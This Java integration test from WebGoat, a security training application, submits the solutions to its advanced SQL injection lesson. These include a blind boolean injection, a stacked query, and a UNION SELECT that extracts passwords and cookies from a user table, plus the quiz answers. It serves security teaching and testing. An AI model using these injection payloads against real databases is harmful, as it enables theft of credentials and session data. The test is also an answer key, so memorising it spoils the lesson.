/*
 * SPDX-FileCopyrightText: Copyright © 2019 WebGoat authors
 * SPDX-License-Identifier: GPL-2.0-or-later
 */
package org.owasp.webgoat.integration;

import java.util.HashMap;
import java.util.Map;
import org.junit.jupiter.api.Test;

public class SqlInjectionAdvancedIntegrationTest extends IntegrationTest {

  @Test
  public void runTests() {
    startLesson("SqlInjectionAdvanced");

    Map<String, Object> params = new HashMap<>();
    params.put("username_reg", "tom' AND substring(password,1,1)='t");
    params.put("password_reg", "password");
    params.put("email_reg", "someone@microsoft.com");
    params.put("confirm_password", "password");
      checkAssignmentWithPUT(webGoatUrlConfig.url("SqlInjectionAdvanced/register"), params, false);

    params.clear();
    params.put("username_login", "tom");
    params.put("password_login", "thisisasecretfortomonly");
      checkAssignment(webGoatUrlConfig.url("SqlInjectionAdvanced/login"), params, true);

    params.clear();
    params.put("userid_6a", "'; SELECT * FROM user_system_data;--");
      checkAssignment(webGoatUrlConfig.url("SqlInjectionAdvanced/attack6a"), params, true);

    params.clear();
    params.put(
        "userid_6a",
        "Smith' union select userid,user_name, user_name,user_name,password,cookie,userid from"
            + " user_system_data --");
      checkAssignment(webGoatUrlConfig.url("SqlInjectionAdvanced/attack6a"), params, true);

    params.clear();
    params.put("userid_6b", "passW0rD");
      checkAssignment(webGoatUrlConfig.url("SqlInjectionAdvanced/attack6b"), params, true);

    params.clear();
    params.put(
        "question_0_solution",
        "Solution 4: A statement has got values instead of a prepared statement");
    params.put("question_1_solution", "Solution 3: ?");
    params.put(
        "question_2_solution",
        "Solution 2: Prepared statements are compiled once by the database management system"
            + " waiting for input and are pre-compiled this way.");
    params.put(
        "question_3_solution",
        "Solution 3: Placeholders can prevent that the users input gets attached to the SQL query"
            + " resulting in a seperation of code and data.");
    params.put(
        "question_4_solution",
        "Solution 4: The database registers 'Robert' ); DROP TABLE Students;--'.");
      checkAssignment(webGoatUrlConfig.url("SqlInjectionAdvanced/quiz"), params, true);
  }
}
